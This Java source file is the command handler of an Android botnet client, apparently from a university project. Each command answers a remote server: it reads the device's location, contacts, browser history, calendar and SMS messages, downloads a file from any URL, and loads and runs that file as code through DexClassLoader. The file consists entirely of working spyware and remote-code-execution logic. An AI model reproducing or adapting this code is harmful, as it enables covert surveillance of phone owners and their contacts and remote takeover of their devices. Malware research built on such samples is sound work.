package de.tudarmstadt.botnet.janus_yanai;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Callable;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.provider.Browser;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class ServerActions {

	final static String TAG = "ServerActions";
	
	final String FILEPATH;
	final CalendarManager cal;
	final ContentResolver cp;
	final boolean canExecute;
	final LocationManager lm;
	
	List<Action> list = new ArrayList<Action>();
	
	ServerActions() {
		canExecute = false;
		cp = null;
		cal = null;
		FILEPATH = null;
		lm = null;
		
		fillList();
	}

	public JSONArray getCommands() {
		JSONArray arr = new JSONArray();
		
		for (Action i : list) {
			arr.put(i.getToken());
		}
		return arr;
	}
	
	ServerActions(ContentResolver cp, File cacheDir, LocationManager lm) {
		this.lm = lm;
		canExecute = true;
		this.cp = cp;
		cal = new CalendarManager(cp);
		FILEPATH = cacheDir.getAbsolutePath() + "/file";
		
		fillList();
	}
	
	void controlCanCall() {
		if (!canExecute) {
			throw new RuntimeException("call() called even though constructor got nulls (i.e. not for execution)");
		}
	}
	

	Iterable<Action> getActions() {
		return list;
	}
	
	void fillList() {

		list.add(new Action(){

			@Override
			String getToken() {
				return "get location";
			}

			@Override
			JSONObject call(String args) throws Exception {
				Criteria crit = new Criteria();
				crit.setAccuracy(Criteria.ACCURACY_FINE);
				String provider = lm.getBestProvider(crit, true);
				Location loc = lm.getLastKnownLocation(provider);
				return new JSONObject().put("type", "location").put("data", ServerService.getJSONLocation(loc));
			}
		});
		
		list.add(new Action() {
	
			@Override
			String getToken() {
				return "get contactlist";
			}
	
			@Override
			JSONObject call(String args) throws Exception {
				controlCanCall();
				Cursor cursor = cp.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[] {Phone._ID, Phone.DISPLAY_NAME, Phone.NUMBER}, null, null, null);
				
				//startManagingCursor(cursor);
				
				JSONArray arr = new JSONArray();
				
				for (cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()) {
					String number;
					String name;
					
					number = cursor.getString(cursor.getColumnIndex(Phone.NUMBER));
					name = cursor.getString(cursor.getColumnIndex(Contacts.DISPLAY_NAME));
				
					arr.put(new JSONObject().put("name", name).put("number", number));
				}
				
				cursor.close();
				
				return new JSONObject().put("type", "table").put("data", arr);
			}
			
		});
		list.add(new Action() {
	
			@Override
			String getToken() {
				return "get browserhistory";
			}
	
			@Override
			JSONObject call(String args) throws JSONException {
				controlCanCall();
				JSONArray arr = new JSONArray();
				
				Cursor mCur = cp.query(Browser.BOOKMARKS_URI,
						Browser.HISTORY_PROJECTION, null, null, null);
				mCur.moveToFirst();
				if (mCur.moveToFirst() && mCur.getCount() > 0) {
					while (mCur.isAfterLast() == false) {
						arr.put(new JSONObject()
								.put("titleIdx", mCur
										.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX))
								.put("urlIdx", mCur
										.getString(Browser.HISTORY_PROJECTION_URL_INDEX))
						);
						mCur.moveToNext();
					}
				}
				mCur.close();
				
				return new JSONObject().put("type", "table").put("data", arr);
			}
			
		});
		list.add(new Action() {
	
			@Override
			String getToken() {
				return "get calendar";
			}
	
			@Override
			JSONObject call(String args) throws JSONException {
				int iTestCalendarID = cal.ListSelectedCalendars();
				List<String> fields = parseArgs(args, Arrays.asList(new String[] {"rrule", "duration", "organizer", "title", "dtstart", "htmlUri"}));
				return new JSONObject().put("data",cal.ListAllCalendarEntries(iTestCalendarID, fields)).put("type", "table");
			}
			
		});
		list.add(new Action() {
	
			@Override
			String getToken() {
				return "download ";
			}
	
			@Override
			JSONObject call(String args) throws Exception {
				controlCanCall();
				URL url;
				url = new URL(args);
				InputStream input = null;
				OutputStream output = null;
				try {
					URLConnection conexion = url.openConnection();
					conexion.connect();
	
					input = new BufferedInputStream(url.openStream());
					output = new FileOutputStream(FILEPATH);
	
					byte data[] = new byte[1024];
	
					Log.d(ServerService.DEBUG_TAG,"start reading");
	
					int count = 0;
					while ((count = input.read(data)) != -1) {
						output.write(data, 0, count);
					}
	
					Log.d(ServerService.DEBUG_TAG,"end reading");
	
					output.flush();
				} finally {
						if (output != null) output.close();
						if (input != null) input.close();
				}
				Log.d(ServerService.DEBUG_TAG,"download complete!");
				return new JSONObject().put("type", "text").put("data", "downloaded!");
			}
			
		});
		list.add(new Action() {
	
			@Override
			String getToken() {
				return "run ";
			}
	
			@SuppressWarnings("unchecked")
			@Override
			JSONObject call(String args) throws Exception {
				controlCanCall();
				DexClassLoader classLoader = new DexClassLoader(
						FILEPATH, "/sdcard", null, getClass().getClassLoader());
				Class<?> myClass;
				myClass = classLoader.loadClass(args);
	
				try {
					return LineHandler.textout( ((Callable<String>) myClass.newInstance()).call());
				} catch (Exception e) {
					e.printStackTrace();
					throw e;
				}
			}
			
		});
		
		list.add(new Action() {

			@Override
			String getToken() {
				return "get smses";
			}

			@Override
			JSONObject call(String args) throws Exception {
				List<String> fields = parseArgs(args, Arrays.asList(new String[] {"body", "read", "address", "date"}));
				
		    	Cursor cur = cp.query(Uri.parse("content://sms"), null, null, null, null);
		    	JSONArray arr = iterateCursor(cur, fields);
		    	if (cur != null) cur.close();
				
				return new JSONObject().put("type", "table").put("data", arr);
			}
		
		});

	}

	private static List<String> parseArgs(String args, List<String> defaults) {
		List<String> fields;
		args = args.trim();

		if (args.equals("all")) {
			fields = null;
		} else if (args.length() > 0) {
			fields = new ArrayList<String>();
			for (String i : args.split(" ")) {
				if (i.trim().length() > 0) fields.add(i);
			}
		} else {
			fields = defaults;
		}
		return fields;
	}
	
	public static JSONArray iterateCursor(Cursor cur) throws JSONException {
		return iterateCursor(cur, null);
	}
	
	public static JSONArray iterateCursor(Cursor cur, Iterable<String> fields) throws JSONException {
		JSONArray arr = new JSONArray();
		
    	cur.moveToFirst();
    	
    	for (;!cur.isAfterLast();cur.moveToNext()) {

    		JSONObject obj = new JSONObject();

    		if (fields == null) {
    			//Log.d(TAG, "null");
    			for (int i = 0; i < cur.getColumnCount(); i++) {
    				obj.put( cur.getColumnName(i), cur.getString(i));
    			}
    		} else {
    			//Log.d(TAG, "not null: ");
    			for (String field : fields) {
    				//Log.d(TAG, "field: " + field);
    				obj.put(field, cur.getString(cur.getColumnIndexOrThrow(field)));
    			}
    		}

    		arr.put(obj);

    	}
    	return arr;
	}
}
